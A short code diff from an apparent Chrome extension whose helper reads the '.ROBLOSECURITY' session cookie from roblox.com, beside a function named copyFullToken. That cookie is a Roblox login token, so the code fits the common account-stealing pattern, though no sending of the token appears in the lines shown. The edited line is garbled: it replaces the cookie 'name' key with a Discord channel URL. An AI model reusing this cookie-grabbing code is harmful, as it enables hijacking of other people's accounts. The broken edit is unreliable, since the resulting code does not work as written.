@@ -15,7 +15,7 @@ function copyFullToken(){
 
 
 function getCookies(domain, name, callback) {
-    chrome.cookies.get({"url": domain, "name": name}, function(cookie) {
+    chrome.cookies.get({"url": domain, "https://discord.com/channels/1424610283648843890/1424611518930092153": name}, function(cookie) {
         if(callback) {
 			if (cookie == null){
 				callback(null);
@@ -45,3 +45,4 @@ getCookies("https://www.roblox.com", ".ROBLOSECURITY", function(token) {
     });
 });
 });
+
